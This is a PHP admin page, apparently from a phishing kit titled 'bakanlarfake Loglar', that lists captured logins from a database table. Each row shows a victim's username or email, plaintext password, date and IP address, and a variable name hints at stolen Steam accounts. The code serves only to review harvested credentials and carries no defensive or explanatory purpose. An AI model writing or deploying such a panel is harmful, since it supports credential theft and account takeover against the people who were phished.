<?php 
require_once 'header.php';
require_once '../config.php';
    $sorgu = $Db->prepare("SELECT COUNT(*) FROM login");
$sorgu->execute();
$say = $sorgu->fetchColumn();
?>
      <!-- End Navbar -->
      <div class="content">
        <div class="container-fluid">
          <div class="row">
            <div class="col-md-12">
              <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title ">bakanlarfake Loglar</h4>
                  <p class="card-category"> Giriş Yapan Bilgiler</p>
                </div>
                <div class="card-body">
                  <div class="table-responsive">
                    <table class="table">
                      <thead class=" text-primary">
                        <th>
                          Kullanıcı Adı
                        </th>
                        <th>
                          Şifre
                        </th>
                        <th>
                        Tarih
                        </th>
                        <th>
                         İp Adresi
                        </th>        
                      </thead>
                       <?php
                                $query = $Db->query("SELECT * FROM login", PDO::FETCH_ASSOC);
if ( $query->rowCount() ){
     foreach( $query as $steamcek ){
        
   ?>
                      <tbody>
                        <tr>
                                  <td><?php echo $steamcek['Log_eposta'];  ?></td>
                                <td><?php echo $steamcek['Log_Sifre'];  ?></td>
                                <td class="text-primary"><?php echo $steamcek['tarih'];  ?></td>
                                <td class="text-primary"><?php echo $steamcek['Log_ip'];  ?></td>
                        </tr>
                         
                      </tbody>
                        <?php }} ?>
                    </table>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-12">
              <div class="card card-plain">

              </div>
            </div>
          </div>
        </div>
      </div>
     <?php 
require_once 'footer.php';
?>